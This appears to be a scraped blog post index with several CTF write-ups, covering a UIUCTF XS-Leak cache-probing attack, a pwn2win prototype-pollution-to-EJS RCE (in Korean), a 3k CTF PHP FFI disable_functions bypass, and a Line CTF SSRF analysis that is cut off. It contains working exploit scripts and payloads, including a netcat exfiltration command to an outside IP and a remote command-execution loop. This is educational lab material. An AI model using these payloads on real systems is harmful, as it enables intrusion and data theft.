uiuctf{[a-z0-9_]}(async function () {  const browser = await chromium.launch({    executablePath: \"/playwright/chromium-878941/chrome-linux/chrome\",    logger: {      isEnabled: () =&gt; true,      log: (name, severity, message, _args) =&gt; console.log(`chrome log: [${name}/${severity}] ${message}`)    }  });  function ask_for_url(socket) {    socket.state = 'URL';    socket.write('Please send me a URL to open.\\n');  }  async function load_url(socket, data) {    let url = data.toString().trim();    console.log(`checking url: ${url}`);    if (!url.startsWith('http://') &amp;&amp; !url.startsWith('https://')) {      socket.state = 'ERROR';      socket.write('Invalid scheme (http/https only).\\n');      socket.destroy();      return;    }    socket.state = 'LOADED';    // \"incognito\" by default    const context = await browser.newContext();    const page = await context.newPage();    await page.goto(\"https://chal.yana.wtf\");    await page.fill('#note &gt; textarea', FLAG);    await page.click('#note &gt; button');    await page.waitForTimeout(500);    await page.goto('about:blank');    await page.waitForTimeout(500);    socket.write(`Loading page ${url}.\\n`);    await page.goto(url);    setTimeout(() =&gt; {      try {        page.close();        socket.write('timeout\\n');        socket.destroy();      } catch (err) {        console.log(`err: ${err}`);      }    }, 60000);  }  var server = net.createServer();  server.listen(1338);  console.log('listening on port 1338');  server.on('connection', socket =&gt; {    socket.on('data', data =&gt; {      try {        if (socket.state == 'URL') {          load_url(socket, data);        }      } catch (err) {        console.log(`err: ${err}`);      }    });    try {      ask_for_url(socket);    } catch (err) {      console.log(`err: ${err}`);    }  });})();Now let’s analyze bot.js to get flags.  Analysis ( bot.js )  Read the /flag.txt file and save it to FLAG variable.  Running a chrome instance using playwright-chromium.  Go to https://chal.yana.wtf, save FLAG in the note, and access the URL that we entered as an administrator. ( Important )We learned a lot from our analysis !!In bot.js, flags are stored in notes. Also we know the flag format. ( uiuctf{[a-z0-9_]} ). That is, we can brute force using uiuctf{. This is where ‘Cache Probing’ is used. I know that when I search for a value contained in a note, a green image appears.Then, if we retrieve the value contained in the note, the browser loads a green image. At this time, since it is loaded for the first time, it will be cached on disk. At this time, if we retrieve the green image one more time, the image can be loaded much faster than the first time since the cache is already saved.&lt;script&gt;    const image = \"https://sigpwny.com/uiuctf/y.png\"    const requestbin = \"//79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/\"    window.open(`https://chal.yana.wtf/#a`);    setTimeout(() =&gt; {        const start = new Date();        fetch(image).then(d =&gt; {            const end = new Date();            location.replace(requestbin + \"?time=\" + (end-start));        });    }, 1000)&lt;/script&gt;First of all, this is the exploit code that sends a query that is not saved in the memo. In the above situation, the browser will load a red image. Then the green image will take a lot of time because it is the first to load.Let’s check it out.Nice, When sending a query that does not contain it, it took about 43s?43ms.&lt;script&gt;    const image = \"https://sigpwny.com/uiuctf/y.png\"    const requestbin = \"//79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/\"    window.open(`https://chal.yana.wtf/#uiu`);    setTimeout(() =&gt; {        const start = new Date();        fetch(image).then(d =&gt; {            const end = new Date();            location.replace(requestbin + \"?time=\" + (end-start));        });    }, 1000)&lt;/script&gt;Now, let’s check the loading time when sending the query included in the note.OMG When sending the included query, it took about 3s?3ms?!!Now let’s use this to brute force. However, when doing brute force, sending many requests at once can cause bot.js to close.I got one letter and proceeded with a new run.&lt;script&gt;    const image = \"https://sigpwny.com/uiuctf/y.png\"    const requestbin = \"//141.164.52.207:9999/flag\"    const flag = location.search.split('=')[1]    window.open(`https://chal.yana.wtf/#${flag}`);    setTimeout(() =&gt; {        const start = new Date();        fetch(image).then(d =&gt; {            end = new Date();            if ((end-start) &lt; 8){                location.replace(requestbin + `?flag=${flag}`);            }            //}        });    }, 1000)&lt;/script&gt;# exploit.pyfrom pwn import *from time import sleepfrom flask import *from sys import exitfrom threading import * app = Flask(__name__)bot_url = \"yana-bot.chal.uiuc.tf\"bot_port = 1337condition = True#FLAG = b\"uiuctf{\"#FLAG = b\"uiuctf{y\"#FLAG = b\"uiuctf{y0\"# (...)#FLAG = b\"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo\"#FLAG = b\"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0\"#FLAG = b\"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0k\"#FLAG = b\"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0ku\"FLAG = b\"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0kup\"poc_url = b\"http://141.164.52.207/xsleak/exploit.html?a=\"char_list = list('abcdefghijklmnopqrstuvwxyz1234567890}{_')@app.route('/flag')def index():    global FLAG, condition    FLAG = request.args.get('flag')    condition = False    log.info(\"Success!\")    log.info(f'The flag is : {FLAG}')    return \"Success\"def send_bot():    global condition    for char in char_list:        if condition:            bot = remote(bot_url, bot_port, level='error' )            url = poc_url + FLAG + char.encode('utf-8')            #log.info(f'Send url : {url}')            sleep(1)            bot.sendlineafter(b'Please send me a URL to open.\\n', url)        else:            exit(0)def run_flask():    app.run(host=\"0.0.0.0\", port=9999)if __name__ == '__main__':    t1 = Thread(target=run_flask)    t2 = Thread(target=send_bot)    t1.start()    t2.start()The exploit code is as above. So I’ll execute an exploit code!(skip..)Success! I got the flag :)FLAG : uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0kup}"
  },
  
  {
    "title": "pwn2win CTF Illusion Write Up",
    "url": "/posts/Pwn2win/",
    "categories": "",
    "tags": "",
    "date": "2021-06-01 08:29:53 +0900",
    





    
    "snippet": "Analysis : Introduce위 사진을 보면 fast-json-patch 모듈의 applyPatch() 메서드를 이용해서 a라는 메서드를 패치 시켜주는데, 이때 내부 오퍼레이션에 의해서 Prototype Pollution 취약점이 발생한다. 인자로는 2개의 값을 보내주는 것을 볼 수 있다. 첫 번째 인자는 패치할 주체가 들어가고, 두 번째 인자...",
    "content": "Analysis : Introduce위 사진을 보면 fast-json-patch 모듈의 applyPatch() 메서드를 이용해서 a라는 메서드를 패치 시켜주는데, 이때 내부 오퍼레이션에 의해서 Prototype Pollution 취약점이 발생한다. 인자로는 2개의 값을 보내주는 것을 볼 수 있다. 첫 번째 인자는 패치할 주체가 들어가고, 두 번째 인자로는 패치의 적용할 데이터를 Json 형식으로 보내는 것을 볼 수 있고, 이 두 번째 인자에서 두 번째 값인 path 키의 대해서 Prototype Pollution 취약점이 발생한다.Analysis : applyPatch()function applyPatch(document, patch, validateOperation, mutateDocument, banPrototypeModifications) {    if (mutateDocument === void 0) { mutateDocument = true; }    if (banPrototypeModifications === void 0) { banPrototypeModifications = true; }    if (validateOperation) {        if (!Array.isArray(patch)) {            throw new exports.JsonPatchError('Patch sequence must be an array', 'SEQUENCE_NOT_AN_ARRAY');        }    }    if (!mutateDocument) {        document = helpers_js_1._deepClone(document);    }    var results = new Array(patch.length);    for (var i = 0, length_1 = patch.length; i &lt; length_1; i++) {        // we don't need to pass mutateDocument argument because if it was true, we already deep cloned the object, we'll just pass `true`        results[i] = applyOperation(document, patch[i], validateOperation, true, banPrototypeModifications, i);        document = results[i].newDocument; // in case root was replaced    }    results.newDocument = document;    return results;}applyPatch() 메서드는 core.js 파일에 정의가 되어 있다. 코드를 보면 중간 부분에 patch 배열을 for 문으로 돌려가며 하나씩 applyOperation() 메서드의 두 번째 인자로 넘겨주는 것을 볼 수 있고, 첫 번째 인자는 당연 우리가 보내준 패치 될 주체이다. 여 기서 patch는 우리가 위에서 applyPatch() 함수에 넘겨준 두 번째 인자값이 된다.applyOperation() 메서드를 호출하는 것을 보면 우리가 보낸 패치 파일을 다중으로 적용하는 것이 아닌 단일로 하나씩 적용하는 것으로 보인다.Analsys : applyOperation()function applyOperation(document, operation, validateOperation, mutateDocument, banPrototypeModifications, index) {    if (validateOperation === void 0) { validateOperation = false; }    if (mutateDocument === void 0) { mutateDocument = true; }    if (banPrototypeModifications === void 0) { banPrototypeModifications = true; }    if (index === void 0) { index = 0; }    if (validateOperation) {        if (typeof validateOperation == 'function') {            validateOperation(operation, 0, document, operation.path);        }        else {            validator(operation, 0);        }    }    /* ROOT OPERATIONS */    if (operation.path === \"\") {        var returnValue = { newDocument: document };        if (operation.op === 'add') {        ...    else {        if (!mutateDocument) {            document = helpers_js_1._deepClone(document);        }        var path = operation.path || \"\";        var keys = path.split('/');        var obj = document;        var t = 1; //skip empty element - http://jsperf.com/to-shift-or-not-to-shift        var len = keys.length;        var existingPathFragment = undefined;        var key = void 0;        var validateFunction = void 0;        if (typeof validateOperation == 'function') {            validateFunction = validateOperation;        }        else {            validateFunction = validator;        }        while (true) {            key = keys[t];            if (banPrototypeModifications &amp;&amp; key == '__proto__') {                throw new TypeError('JSON-Patch: modifying `__proto__` prop is banned for security reasons, if this was on purpose, please set `banPrototypeModifications` flag false and pass it to this function. More info in fast-json-patch README');            }            if (validateOperation) {                if (existingPathFragment === undefined) {                    if (obj[key] === undefined) {                        existingPathFragment = keys.slice(0, t).join('/');                    }                    else if (t == len - 1) {                        existingPathFragment = operation.path;                    }                    if (existingPathFragment !== undefined) {                        validateFunction(operation, 0, document, existingPathFragment);                    }                }            }            t++;            if (Array.isArray(obj)) {                if (key === '-') {                    key = obj.length;                }                else {                    if (validateOperation &amp;&amp; !helpers_js_1.isInteger(key)) {                        throw new exports.JsonPatchError(\"Expected an unsigned base-10 integer value, making the new referenced value the array element with the zero-based index\", \"OPERATION_PATH_ILLEGAL_ARRAY_INDEX\", index, operation, document);                    } // only parse key when it's an integer for `arr.prop` to work                    else if (helpers_js_1.isInteger(key)) {                        key = ~~key;                    }                }                if (t &gt;= len) {                    if (validateOperation &amp;&amp; operation.op === \"add\" &amp;&amp; key &gt; obj.length) {                        throw new exports.JsonPatchError(\"The specified index MUST NOT be greater than the number of elements in the array\", \"OPERATION_VALUE_OUT_OF_BOUNDS\", index, operation, document);                    }                    var returnValue = arrOps[operation.op].call(operation, obj, key, document); // Apply patch                    if (returnValue.test === false) {                        throw new exports.JsonPatchError(\"Test operation failed\", 'TEST_OPERATION_FAILED', index, operation, document);                    }                    return returnValue;                }            }            else {                if (key &amp;&amp; key.indexOf('~') != -1) {                    key = helpers_js_1.unescapePathComponent(key);                }                if (t &gt;= len) {                    var returnValue = objOps[operation.op].call(operation, obj, key, document); // Apply patch                    if (returnValue.test === false) {                        throw new exports.JsonPatchError(\"Test operation failed\", 'TEST_OPERATION_FAILED', index, operation, document);                    }                    return returnValue;                }            }            obj = obj[key];        }    }}applyOperation() 메서드를 보면 중간에 슬래쉬를 이용해서 path 값을 스플릿하는 것을 볼 수 있다. 우리는 path의 값으로 \"/constructor/prototype/polluted\"와 같이 주었기 때문에 keys의 값은 ['constructor', 'prototype', 'polluted']가 된다.이렇게 값을 스플릿 해준 후에 keys.length만큼 와일문을 돌린다. 이때 keys 값으로 __proto__가 들어오면 JSON-Patch: modifying '__proto__' prop is banned for security reasons, if this was on purpose, please set 'banPrototypeModifications' flag false and pass it to this function. More info in fast-json-patch READM와 같은 구문을 출력하고 끝내는 것을 볼 수 있다. 아마도 Prototype Pollution을 방지한 것 같다.하지만 __proto__ 프로퍼티와 constructor.prototype 프로퍼티는 동일하기 때문에 이를 이용해서 Prototype Pollution 공격을 할 수 있다.와일문을 돌면서 if 문을 이용해서 조건에 맞는 오퍼레이션을 하는 것으로 보인다.  첫 번째 조건은 일단 key의 값으로 __proto__가 존재하지 않아야 한다.  두 번째 조건은 validateOperation의 값이 참이어야 한다.  세 번째 조건은 우리가 전달해준 패치가 될 주체가 Array여야 한다.            else {                if (key &amp;&amp; key.indexOf('~') != -1) {                    key = helpers_js_1.unescapePathComponent(key);                }                if (t &gt;= len) {                    var returnValue = objOps[operation.op].call(operation, obj, key, document); // Apply patch                    if (returnValue.test === false) {                        throw new exports.JsonPatchError(\"Test operation failed\", 'TEST_OPERATION_FAILED', index, operation, document);                    }                    return returnValue;                }            }위 세 가지지 조건을 모두 위배할 경우에는 위 코드가 실행이 된다. 일단 우리는 patch의 값으로 ~가 들어간 곳이 없기 때문에 3번 모두 else문이 실행이 될 것 이다. else 문을 보면 objOps를 이용해서 패치를 하는 것을 볼 수 있고, 인자로는 연산자, 패치 될 주체, 패치할 값, 패치 될 주체를 넘겨주고 있는 것을 볼 수 있다. 여기서 우리는 연산자를 넘겨줄 때, replace를 넘겨주었다.Analysis : objOpsvar objOps = {    add: function (obj, key, document) {        obj[key] = this.value;        return { newDocument: document };    },    remove: function (obj, key, document) {        var removed = obj[key];        delete obj[key];        return { newDocument: document, removed: removed };    },    replace: function (obj, key, document) {        var removed = obj[key];        obj[key] = this.value;        return { newDocument: document, removed: removed };    },    move: function (obj, key, document) {        /* in case move target overwrites an existing value,        return the removed value, this can be taxing performance-wise,        and is potentially unneeded */        var removed = getValueByPointer(document, this.path);        if (removed) {            removed = helpers_js_1._deepClone(removed);        }        var originalValue = applyOperation(document, { op: \"remove\", path: this.from }).removed;        applyOperation(document, { op: \"add\", path: this.path, value: originalValue });        return { newDocument: document, removed: removed };    },    copy: function (obj, key, document) {        var valueToCopy = getValueByPointer(document, this.from);        // enforce copy by value so further operations don't affect source (see issue #177)        applyOperation(document, { op: \"add\", path: this.path, value: helpers_js_1._deepClone(valueToCopy) });        return { newDocument: document };    },    test: function (obj, key, document) {        return { newDocument: document, test: _areEquals(obj[key], this.value) };    },    _get: function (obj, key, document) {        this.value = obj[key];        return { newDocument: document };    }};objOps를 보면 내부에 여러 함수들이 정의되어 있는 것을 볼 수 있다. 키:값을 추가, 삭제, 리플레이스, 이동, 복사 등 등을 할 수 있는 것으로 보이고, 무엇을 실행할 지는 objOps에 인자로 넘어온 값을  통해서 판단하고 있다.우리는 연산자로 replace를 보냈다.    replace: function (obj, key, document) {        var removed = obj[key];        obj[key] = this.value;        return { newDocument: document, removed: removed };    },replace() 메서드를 확인해보면 key의 값을 value를 넣어주고 있는 것을 볼 수 있고, 바로 여기서 Prototype Pollution 취약점이 발생한다.const a = {};const patch = [{op: \"replace\", path: \"/constructor/prototype/polluted\", value: \"Prototype Pollution\"}];fastjsonpatch.applyPatch(a, patch);우리는 위처럼 path 값을 전송을 했다. 그러니 내부 오퍼레이션에 의해서 와일문을 돌고, 제일 마지막 번째에서는 마치 a['constructor']['prototype']['polluted']와 같이 작동을 하게 되어 Prototype Pollution이 발생한다.Exploit (Web) pwn2win CTF 2021 [152 pts]이번 주말에는 pwn2win CTF 2021이라는 대회가 열렸는데 해당 대회에서 웹 문제 중에 솔브가 제일 많은 문제가 Prototype Pollution to RCE in ejs를 이용한 문제였다. 하지만 삽질 실수를 해서 Prototype Pollution 공격을 하지 못 했고, 대회가 끝나고 롸업을 본 후에 npm 공식 사이트를 보니 거의 중간에 답이 있어서 매우 아쉬운 문제다.FROM node:alpineEXPOSE 1337# copy flagCOPY flag.txt /root/flag.txt# copy readflag binary (it just reads the flag)COPY readflag /RUN chmod 4755 /readflag# install web applicationCOPY src /appRUN cd /app &amp;&amp; npm install# change to guest userUSER 405# run application and stay alive for 5 minutesCOPY entrypoint.sh /ENTRYPOINT /entrypoint.sh도커 파일을 확인해보면 /readflag라는 바이너리 파일을 실행 시키면 될 거 같다.const express = require('express')const bodyParser = require('body-parser')const jsonpatch = require('fast-json-patch')const ejs = require('ejs')const basicAuth = require('express-basic-auth')const app = express()// Middlewares //app.use(bodyParser.json())app.use(basicAuth({    users: { \"admin\": process.env.SECRET || \"admin\" },    challenge: true}))/////////////////let services = {    status: \"online\",    cameras: \"online\",    doors: \"online\",    dome: \"online\",    turrets: \"online\"}// Static folderapp.use(\"/static\", express.static(__dirname + \"/static\"));// Homepageapp.get(\"/\", async (req, res) =&gt; {    const html = await ejs.renderFile(__dirname + \"/templates/index.ejs\", {services})    res.end(html)})// APIapp.post(\"/change_status\", (req, res) =&gt; {    let patch = []    Object.entries(req.body).forEach(([service, status]) =&gt; {        if (service === \"status\"){            res.status(400).end(\"Cannot change all services status\")            return        }        patch.push({            \"op\": \"replace\",            \"path\": \"/\" + service,            \"value\": status        })    });    jsonpatch.applyPatch(services, patch)    if (\"offline\" in Object.values(services)){        services.status = \"offline\"    }    res.json(services)})app.listen(1337, () =&gt; {    console.log(`App listening at port 1337`)})서버 측 코드를 확인해보면 /change_status에서 json으로 값을 받아와서 patch 배열에 입력값을 푸쉬한 후에 applyPatch() 메서드에 인자로 넘겨주는 것을 볼 수 있다. 이 뒤로는 위 분석을 통해 충분히 확인하였으니 따로 부연 설명은 생략.그럼 Prototype Pollution은 성공했지만 RCE를 어떻게 발생시켜야 할 지 확인 해야한다.// Homepageapp.get(\"/\", async (req, res) =&gt; {    const html = await ejs.renderFile(__dirname + \"/templates/index.ejs\", {services})    res.end(html)})index를 보면 ejs의 renderFile() 메서드를 이용해서 템플릿을 반환하는 것을 볼 수 있다.exports.renderFile = function () {  var args = Array.prototype.slice.call(arguments);  var filename = args.shift();  var cb;  var opts = {filename: filename};  var data;  var viewOpts;  // Do we have a callback?  if (typeof arguments[arguments.length - 1] == 'function') {    cb = args.pop();  }  // Do we have data/opts?  if (args.length) {    // Should always have data obj    data = args.shift();    // Normal passed opts (data obj + opts obj)    if (args.length) {      // Use shallowCopy so we don't pollute passed in opts obj with new vals      utils.shallowCopy(opts, args.pop());    }    // Special casing for Express (settings + opts-in-data)    else {      // Express 3 and 4      if (data.settings) {        // Pull a few things from known locations        if (data.settings.views) {          opts.views = data.settings.views;        }        if (data.settings['view cache']) {          opts.cache = true;        }        // Undocumented after Express 2, but still usable, esp. for        // items that are unsafe to be passed along with data, like `root`        viewOpts = data.settings['view options'];        if (viewOpts) {          utils.shallowCopy(opts, viewOpts);        }      }      // Express 2 and lower, values set in app.locals, or people who just      // want to pass options in their data. NOTE: These values will override      // anything previously set in settings  or settings['view options']      utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);    }    opts.filename = filename;  }  else {    data = {};  }  return tryHandleCache(opts, data, cb);};renderFile() 메서드 하단을 보면 tryHandleCache() 메서드를 호출하는 것을 볼 수 있다.function tryHandleCache(options, data, cb) {  var result;  if (!cb) {    if (typeof exports.promiseImpl == 'function') {      return new exports.promiseImpl(function (resolve, reject) {        try {          result = handleCache(options)(data);          resolve(result);        }        catch (err) {          reject(err);        }      });    }    else {      throw new Error('Please provide a callback function');    }  }  else {    try {      result = handleCache(options)(data);    }    catch (err) {      return cb(err);    }    cb(null, result);  }}tryHandleCache() 메서드에서는 handleCache() 메서드를 호출하는 것을 볼 수 있다.function handleCache(options, template) {  var func;  var filename = options.filename;  var hasTemplate = arguments.length &gt; 1;  if (options.cache) {    if (!filename) {      throw new Error('cache option requires a filename');    }    func = exports.cache.get(filename);    if (func) {      return func;    }    if (!hasTemplate) {      template = fileLoader(filename).toString().replace(_BOM, '');    }  }  else if (!hasTemplate) {    // istanbul ignore if: should not happen at all    if (!filename) {      throw new Error('Internal EJS error: no file name or template '                    + 'provided');    }    template = fileLoader(filename).toString().replace(_BOM, '');  }  func = exports.compile(template, options);  if (options.cache) {    exports.cache.set(filename, func);  }  return func;}handleCache() 메서드에서는 export.compile() 메서드를 또 호출한다.exports.compile = function compile(template, opts) {  var templ;  // v1 compat  // 'scope' is 'context'  // FIXME: Remove this in a future version  if (opts &amp;&amp; opts.scope) {    if (!scopeOptionWarned){      console.warn('`scope` option is deprecated and will be removed in EJS 3');      scopeOptionWarned = true;    }    if (!opts.context) {      opts.context = opts.scope;    }    delete opts.scope;  }  templ = new Template(template, opts);  return templ.compile();};export.compile() 메서드에서는 Tempalte()이라는 객체를 생성자를 이용해서 생성하고, 생성한 템플릿 객체로 compile() 메서드를 실행하는 것을 볼 수 있다. ejs 모듈 내부는 처음보는데 아마 이 Template() 객체가 웹 프론트 단에 출력되는 부분인 거 같다.  compile: function () {    /** @type {string} */    ...    if (!this.source) {      this.generateSource();      prepended +=        '  var __output = \"\";\\n' +        '  function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }\\n';      if (opts.outputFunctionName) {        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\\n';      }    ...compile() 메서드를 확인 해보면 outputFunctionName을 이용해서 문자열을 만드는 것을 볼 수 있다. 즉, 우리는 applyPatch()에서 발생하는 Prototype Pollution 취약점을 이용해서 compile() 메서드에서 사용되는 outputFunctionName 값을 잘 조작해 문자열을 맞춰 RCE를 발생시켜야 한다.POST /change_status HTTP/1.1Host: illusion.pwn2win.party:44211Cache-Control: max-age=0Authorization: Basic YWRtaW46cXp0bG5mdXlzZXVxeWpmaQ==Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: _ga=GA1.2.687081227.1622238128; _gid=GA1.2.492571223.1622429990Content-Type: application/jsonConnection: closeContent-Length: 155{    \"constructor/prototype/outputFunctionName\": \"_; process.mainModule.require('child_process').execSync('./readflag | nc 141.164.52.207 80');//\"}그래서 위와 같이 값을 보내 Prototype Pollution을 이용해서 outputFunctionName의 값을 value 값으로 오염을 시켜주었다.그리고 index 페이지로 접속을 하게 되면 ejs.renderFile() 메서드가 실행 될 때, 이미 outputFunctionName의 값이 js exploit code로 오염이 되어 있어 RCE가 발생해 플래그를 얻을 수 있었다.FLAG : CTF-BR{d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!}"
  },
  
  {
    "title": "3k CTF 2021 online_compiler Write Up",
    "url": "/posts/3K-CTF/",
    "categories": "",
    "tags": "",
    "date": "2021-05-18 08:29:53 +0900",
    





    
    "snippet": "  The online_compiler challenge is bypass the disable_functions and get the flag.First at challenge, Given the back-end code and php.ini file. When execute the php code at back-end you just need to...",
    "content": "  The online_compiler challenge is bypass the disable_functions and get the flag.First at challenge, Given the back-end code and php.ini file. When execute the php code at back-end you just need to checked the execute based on php.ini file. If u check the php.ini file, you will see many functions are disabled based on disable_functions. Deservedly, Was disabled function that shell command can be execute.But, Because phpinfo() is not disabled, I can check the PHP Version as above and can know using the 7.4.X version in server. So, I did a search for vulnerabilities that occur in that version.I found content as above while gooling. I did a gooling keyword is php 7.4 disable_functions bypass. As above content is one among several bypass list. So, I checked FFI in phpinfo() and it was enabled.I did say without thinking \"This seem the most possible\" to jingyu bro on may 7 pm 7 hour. Fucking, After that, I did googling for another 2 hour.First, I first looked at FFI and it stands for Foreign function interface, which is an external function interface, but I didn’t know how to use it. Then I found a strange article, and I could see the cdef() method used in the FFI class. It can be seen that an object is created by inserting a C language function prototype as the argument value of cdef(), and an external function is executed by referring to the function prototype created from the object.The prototype of the C Language system() function was as above. It seems like it was because I didn’t do it as a pointer variable when I just did `const char command’.&lt;?php   $ffi=FFI::cdef(\"int system(const char *command);\");  $ffi-&gt;system('ls');?&gt;So, as a result, the payload was written as above. At first, like the picture above, the library file was also passed as a parameter, but it didn’t work well when passed. Probably because there is no file in the same path, it seems like that, but even without it, there was no problem.When I wrote the code in Python and checked it, the El_FlAAG___FilEE file existed in the upper directory. So when I read the file, a flag came out. In the end, it was correct that I did say to jingyu bro on 7 pm earlier. zzimport requestsfrom pwn import *url = 'http://onlinecompiler.2021.3k.ctf.to:5000/'path = ['save', 'compile']while(1):    command = raw_input(\"pocas@py : \")    c_type, code = 'php', '&lt;?php $ffi=FFI::cdef(\"int system(const char *command);\");$ffi-&gt;system(\\'{}\\');?&gt;'.format(command)    body1 = {'c_type':c_type, 'code':code}    # save     filename = requests.post(url + path[0], data=body1).text    log.info(\"Exploitation\")    log.info(\"filename : \" + filename)    # compile     body2 = {'c_type':c_type, 'filename':filename}    result = requests.post(url + path[1], data=body2).text.replace('\\n', ' ')    log.info(\"result : \" + result)FLAG : 3k{JuSt_A_WaRmUp_O.o}"
  },
  
  {
    "title": "Line CTF 2021 diveinternal Write Up",
    "url": "/posts/Line-CTF/",
    "categories": "",
    "tags": "",
    "date": "2021-03-22 08:29:53 +0900",
    





    
    "snippet": "I solved one challenge for web(Web) diveinternal [50 pts]  The diveinternal challenge is to get a flag using an ssrf vulenrability.var express = require('express');var request = require('request');...",
    "content": "I solved one challenge for web(Web) diveinternal [50 pts]  The diveinternal challenge is to get a flag using an ssrf vulenrability.var express = require('express');var request = require('request');var querystring = require('querystring');var router = express.Router();if (process.env.NODE_ENV == 'local') { //set the environment value before your running this app  require('dotenv').config();}var target = process.env.TARGET_HOST;var test = process.env.TEST;/* GET home page. */router.get('/', function(req, res, next) {  request({    headers: req.headers,    uri: `http://${target}/`,  }, function(err, data){    res.render('index', { title: 'apis' , data: data.body});  });  });router.get('/coin', function(req, res, next) {  request({        headers: req.headers,        uri: `http://${target}/coin`,      }).pipe(res);  });  router.get('/addsub', function(req, res, next) {    request({                    uri: `http://${target}/addsub`,          qs: {            email: req.query.email,          }        }).pipe(res);    });  module.exports = router;Above code is code of api, I can see that send a request using a ${target}.TEST=testTARGET_HOST=localhost:5050Also, I can know that send a request to internal server because TARGET_HOST is localhostFROM node:lts-alpine as baseADD ./src /srcWORKDIR /srcCOPY /src/package*.json /EXPOSE 3000FROM base as productionENV NODE_ENV=productionENV TARGET_HOST=private:5000RUN npm install -g nodemon &amp;&amp; npm installRUN npm ciCOPY . /CMD [\"node\", \"bin/www\"]FROM base as devENV NODE_ENV=developmentENV DEBUG=frontend:*ENV TARGET_HOST=private:5000RUN npm install -g nodemon &amp;&amp; npm installCOPY . /CMD [\"nodemon\", \"bin/www\"]FROM base as localENV NODE_ENV=developmentENV DEBUG=frontend:*ENV TARGET_HOST=localhost:5050RUN npm install -g nodemon &amp;&amp; npm installCOPY . /CMD [\"nodemon\", \"bin/www\"]When I check a docker file, I can know to was open a 5050/5000 port. Viz, I can able use a localhost:5050, localhost:5000.def RunRollbackDB(dbhash):    try:        if os.environ['ENV'] == 'LOCAL':            return        if dbhash is None:            return \"dbhash is None\"        dbhash = ''.join(e for e in dbhash if e.isalnum())        if os.path.isfile('backup/'+dbhash):            with open('FLAG', 'r') as f:                flag = f.read()                return flag        else:            return \"Where is file?\"And first, when I see an important flag reading condition, If environment of server is not Local and exist a file called 'backup/' + dbhash, retrun a flag.@app.route('/coin', methods=['GET'])def coin():    try:        response = app.response_class()        language = LanguageNomarize(request)        response.headers[\"Lang\"] =  language        data = getCoinInfo()        response.data = json.dumps(data)        return response    except Exception as e :        err = 'Error On  {f} : {c}, Message, {m}, Error on line {l}'.format(f = sys._getframe().f_code.co_name ,c = type(e).__name__, m = str(e), l = sys.exc_info()[-1].tb_lineno)        logger.error(err)First, I can see that when api server send a request to /coin , put a result value of LanguageNomarize() function to header called Lang and to reponse after bring an information of coin using a getCoinInfo() function.def LanguageNomarize(request):    if request.headers.get('Lang') is None:        return \"en\"    else:        regex = '^[!@#$\\\\/.].*/.*' # Easy~~        language = request.headers.get('Lang')        language = re.sub(r'%00|%0d|%0a|[!@#$^]|\\.\\./', '', language)        if re.search(regex,language):            return request.headers.get('Lang')                try:            data = requests.get(request.host_url+language, headers=request.headers)            if data.status_code == 200:                return data.text            else:                return request.headers.get('Lang')        except:            return request.headers.get('Lang')When I see a LanguateNomarize() function, If to exist a header called Lang, confirm a value of header using regular expression, and I can see to send a request using a request.get() function. In here, Occur an ssrf vulnerability because I can send a request of where I want after modifying a request.host_url and language.@app.route('/integrityStatus', methods=['GET'])def integritycheck():    data = {'db':'database/master.db','dbhash':activity.dbHash}    data = json.dumps(data)    return dataSecond, I’ll check the /integrityStatus. We usually can’t send a request because /integrityStatus not communicating to api server. But I can find a value of dbhash by making a request to /integrityStatus using an ssrf vulnerability.@app.route('/rollback', methods=['GET'])def rollback():    try:        if request.headers.get('Sign') == None:            return json.dumps(status['sign'])        else:            if SignCheck(request):                pass            else:                return json.dumps(status['sign'])        if request.headers.get('Key') == None:            return json.dumps(status['key'])        result  = activity.IntegrityCheck(request.headers.get('Key'),request.args.get('dbhash'))        return result    except Exception as e :        err = 'Error On  {f} : {c}, Message, {m}, Error on line {l}'.format(f = sys._getframe().f_code.co_name ,c = type(e).__name__, m = str(e), l = sys.exc_info()[-1].tb_lineno)        logger.error(err)        return json.dumps(status['error']), 404Third, I can see that when I see a /rollback, If value of SignCheck() is true and exist a value of header called Key, call an IntegrityCheck() method.    def IntegrityCheck(self,key, dbHash):         if self.integrityKey == key:            pass        else:            return json.dumps(status['key'])        if self.dbHash != dbHash:            flag = RunRollbackDB(dbHash)            logger.debug('DB File changed!!'+dbHash)            file = open(os.environ['DBFILE'],'rb').read()            self.dbHash = hashlib.md5(file).hexdigest()            self.integrityKey = hashlib.sha512((self.dbHash).encode('ascii')).hexdigest()            return flag        return \"DB is safe!\"When I see the IntegrityCheck() method, the value of self.integrityKey and the value of Key are the same, and if the value of self.dbHash and dbHash are not the same, I can see that the RunRollbackDB() function is executed.def RunRollbackDB(dbhash):    try:        if os.environ['ENV'] == 'LOCAL':            return        if dbhash is None:            return \"dbhash is None\"        dbhash = ''.join(e for e in dbhash if e.isalnum())        if os.path.isfile('backup/'+dbhash):            with open('FLAG', 'r') as f:                flag = f.read()                return flag        else:            return \"Where is file?\"                    except Exception as e :        logger.error('Error On  {f} : {c}, Message, {m}, Error on line {l}'.format(f = 